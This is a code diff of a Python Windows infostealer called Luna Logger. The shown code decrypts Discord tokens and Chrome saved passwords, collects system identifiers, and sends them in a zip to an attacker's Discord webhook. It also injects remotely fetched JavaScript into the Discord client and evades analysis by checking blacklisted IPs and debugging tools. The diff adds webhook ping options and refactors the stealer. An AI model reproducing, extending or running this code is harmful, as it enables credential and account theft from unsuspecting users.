@@ -6,12 +6,12 @@ import uuid
 import psutil
 import requests
 import wmi
+import subprocess
 
 from json import loads
 from re import findall, match
 from shutil import copy2
 from sqlite3 import connect
-import subprocess
 from base64 import b64decode
 from subprocess import PIPE, Popen
 from sys import exit
@@ -24,6 +24,8 @@ from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
 webhook = "%webhook_here%"
+ping = "%ping_enabled%"
+pingType = "%ping_type%"
 
 def main(webhook):
     global embed
@@ -53,7 +55,15 @@ def main(webhook):
     _file = None
     _file = File(f'Luna-Logged-{os.getenv("Username")}.zip')
 
-    webhook.send(content="@here", embed=embed, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+
+    content = ""
+    if ping == True:
+        if pingType == "everyone":
+            content += "@everyone"
+        elif pingType == "here":
+            content += "@here"
+
+    webhook.send(content=content, embed=embed, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
 
 def Luna():
@@ -71,7 +81,6 @@ def get_inf():
               stdin=PIPE, stdout=PIPE, stderr=PIPE)
     hwid = ((p.stdout.read() + p.stderr.read()).decode().split("\n")[1])
 
-    cwd = os.getcwd()
     pc_username = os.getenv("UserName")
     pc_name = os.getenv("COMPUTERNAME")
     computer_os = platform.platform()
@@ -111,7 +120,7 @@ class grabtokens():
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
         }
         if token:
-            headers.update({"Authorization": token})
+            headers["Authorization"] = token
         return headers
 
     def get_master_key(self, path):
@@ -166,12 +175,12 @@ class grabtokens():
         for _, path in paths.items():
             if not os.path.exists(path):
                 continue
-            if not "discord" in path:
+            if "discord" not in path:
                 for file_name in os.listdir(path):
                     if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                        for regex in (self.regex):
+                        for regex in self.regex:
                             for token in findall(regex, line):
                                 try:
                                     r = requests.get(
@@ -180,18 +189,17 @@ class grabtokens():
                                     pass
                                 if r.status_code == 200 and token not in self.tokens:
                                     self.tokens.append(token)
-            else:
-                if os.path.exists(self.roaming+'\\discord\\Local State'):
-                    for file_name in os.listdir(path):
-                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                            continue
-                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                            for y in findall(self.encrypted_regex, line):
-                                token = None
-                                token = self.decrypt_password(b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
-                                r = requests.get(self.baseurl, headers=self.getheaders(token))
-                                if r.status_code == 200 and token not in self.tokens: 
-                                    self.tokens.append(token)
+            elif os.path.exists(self.roaming + '\\discord\\Local State'):
+                for file_name in os.listdir(path):
+                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                        continue
+                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                        for y in findall(self.encrypted_regex, line):
+                            token = None
+                            token = self.decrypt_password(b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
+                            r = requests.get(self.baseurl, headers=self.getheaders(token))
+                            if r.status_code == 200 and token not in self.tokens: 
+                                self.tokens.append(token)
 
         if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
             for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
@@ -285,7 +293,7 @@ class grabpassword():
             decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
-        except:
+        except Exception:
             return "Chrome < 80"
 
     def grabPassword_chrome(self):
@@ -327,13 +335,13 @@ class grabpassword():
                         with open("google-passwords.txt", "a") as f:
                             f.write(
                                 f"DB: {login_db}\nDomain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
-            except:
+            except Exception:
                 pass
             cursor.close()
             conn.close()
             try:
                 os.remove("Loginvault.db")
-            except:
+            except Exception:
                 pass
 
         with open(".\\google-passwords.txt", "a") as f:
@@ -432,7 +440,7 @@ def cleanup():
 
         try:
             clean()
-        except:
+        except Exception:
             pass
 
 
@@ -440,30 +448,38 @@ def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
 
 def inject(webhook_url):
-	appdata = os.getenv("localappdata")
-	for _dir in os.listdir(appdata):
-		if 'discord' in _dir.lower():
-			for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
-				if match(r'app-(\d*\.\d*)*', __dir):
-					abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
-					f = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text.replace("%WEBHOOK%", webhook_url)
-					modules_dir = os.listdir(abspath+'\\modules') 
-					with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
-						indexFile.write(f)
-					subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-	
-	if os.path.exists(appdata+'\\discord'):
-		with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'r', encoding="utf-8") as indexFile:
-			index = indexFile.read()
-			if webhook_url in index:
-				webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
-				embed = Embed(title="Luna Logger", color=5639644)
+    appdata = os.getenv("localappdata")
+    for _dir in os.listdir(appdata):
+        if 'discord' in _dir.lower():
+            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
+                if match(r'app-(\d*\.\d*)*', __dir):
+                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
+                    f = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text.replace("%WEBHOOK%", webhook_url)
+                    modules_dir = os.listdir(abspath+'\\modules') 
+                    with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+                        indexFile.write(f)
+                    subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    
+    if os.path.exists(appdata+'\\discord'):
+        with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'r', encoding="utf-8") as indexFile:
+            index = indexFile.read()
+            if webhook_url in index:
+                webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
+                embed = Embed(title="Luna Logger", color=5639644)
 
-				embed.set_footer(text="Luna Logger | Created by Smug")
-				embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
-				embed.add_field(name="Injection", value=f"Successfully injected into Discord\nUser: {os.getenv('UserName')}", inline=False)
-	
-				webhook.send(content="@here", embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
+                embed.set_footer(text="Luna Logger | Created by Smug")
+                embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")
+                embed.add_field(name="Injection", value=f"Successfully injected into Discord\nUser: {os.getenv('UserName')}", inline=False)
+
+                content = ""
+
+                if ping == True:
+                    if pingType == "everyone":
+                        content += "@everyone"
+                    elif pingType == "here":
+                        content += "@here"
+
+                webhook.send(content=content, embed=embed, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
 class debug:
     def __init__(self):
@@ -483,7 +499,7 @@ class debug:
         self.blackListedIPS = ["88.132.231.71", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90",
                                "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", ]
         self.blacklistedProcesses = [
-            "HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe"]
+            "HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe", "HTTPDebuggerUI.exe"]
 
         self.check_process()
 
@@ -539,8 +555,8 @@ if __name__ == '__main__' and os.name == "nt":
     try:
         debug()
         Luna()
-    except:
+    except Exception:
         try:
             cleanup()
-        except:
+        except Exception:
             exit()
